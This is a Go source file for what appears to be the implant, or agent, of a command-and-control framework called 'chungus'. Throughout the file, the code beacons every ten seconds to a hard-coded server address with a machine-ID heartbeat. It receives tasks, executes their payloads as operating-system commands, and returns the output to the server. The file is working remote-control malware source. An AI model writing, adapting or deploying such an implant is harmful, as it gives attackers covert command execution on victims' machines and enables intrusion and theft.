package main

import (
	"bytes"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/BradHacker/chungus/pb"

	"github.com/denisbrodbeck/machineid"
	"google.golang.org/protobuf/proto"
	"google.golang.org/protobuf/types/known/timestamppb"
)

func GenerateHeartbeat() pb.Heartbeat {
	implant_id, _ := machineid.ProtectedID("bigchungusinspacejam")
	return pb.Heartbeat{
		MachineId: implant_id,
		Pid:       int64(os.Getpid()),
		SentAt:    &timestamppb.Timestamp{},
	}
}

func SendHeartbeat(c *net.Conn) error {
	hb := GenerateHeartbeat()
	hbBytes, err := proto.Marshal(&hb)
	if err != nil {
		return fmt.Errorf("couldn't marshalling heartbeat: %v", err)
	}
	numSentBytes, err := (*c).Write(hbBytes)
	if err != nil {
		return fmt.Errorf("couldn't sending heartbeat: %v", err)
	}
	if numSentBytes != len(hbBytes) {
		return fmt.Errorf("didn't send all bytes (sent %d of %d)", numSentBytes, len(hbBytes))
	}
	return nil
}

func SendTaskResponse(c *net.Conn, t *pb.Task, output string, e string) error {
	tRes := pb.TaskResponse{
		Uuid:   t.Uuid,
		Stdout: output,
		Stderr: e,
	}
	tResBytes, err := proto.Marshal(&tRes)
	if err != nil {
		return fmt.Errorf("couldn't marshalling task response: %v", err)
	}
	numSentBytes, err := (*c).Write(tResBytes)
	if err != nil {
		return fmt.Errorf("couldn't sending task response: %v", err)
	}
	if numSentBytes != len(tResBytes) {
		return fmt.Errorf("didn't send all bytes (sent %d of %d)", numSentBytes, len(tResBytes))
	}
	return nil
}

func SpawnConnection(ip string, port int) (*net.Conn, error) {
	con, err := net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		return nil, fmt.Errorf("error dialling remote host")
	}
	return &con, nil
}

func ExecuteTaskCMD(t *pb.Task) (string, string) {
	cmdParts := strings.Split(t.Payload, " ")
	cmd := cmdParts[0]
	args := cmdParts[1:]
	command := exec.Command(cmd, args...)
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	command.Stdout = &stdout
	command.Stderr = &stderr
	err := command.Run()
	if err != nil {
		return "", fmt.Sprintf("error executing task: %v", err)
	}
	return stdout.String(), stderr.String()
}

func ExecuteTaskSCRIPT(t *pb.Task) (string, string) {
	return "", fmt.Sprintf("not implemented yet: %v", t)
}

func CheckForTasks() {
	c, err := SpawnConnection("127.0.0.1", 4444)
	if err != nil {
		fmt.Printf("error while spawning connection: %v", err)
		return
	}
	defer (*c).Close()

	err = SendHeartbeat(c)
	if err != nil {
		fmt.Printf("error while sending heartbeat: %v", err)
		return
	}

	taskBytes := make([]byte, 4069)
	taskNumBytes, err := (*c).Read(taskBytes)
	if err != nil {
		if taskNumBytes == 0 {
			fmt.Println("NOOP")
			return
		}
		fmt.Printf("error reading task: %v", err)
		return
	}
	t := pb.Task{}
	err = proto.Unmarshal(taskBytes[:taskNumBytes], &t)
	if err != nil {
		fmt.Printf("error unmarshalling task: %v", err)
	}

	var stdout string
	var stderr string
	switch t.Type {
	case pb.Task_NOOP:
		fmt.Println("NOOP")
		return // Server expects no response
	case pb.Task_CMD:
		stdout, stderr = ExecuteTaskCMD(&t)
	case pb.Task_SCRIPT:
		stdout, stderr = ExecuteTaskSCRIPT(&t)
	}
	fmt.Printf("%s\n---\n%s\n", stdout, stderr)

	err = SendTaskResponse(c, &t, stdout, stderr)
	if err != nil {
		fmt.Printf("error sending task response")
		return
	}
}

func main() {
	for {
		CheckForTasks()
		time.Sleep(10 * time.Second)
	}
}
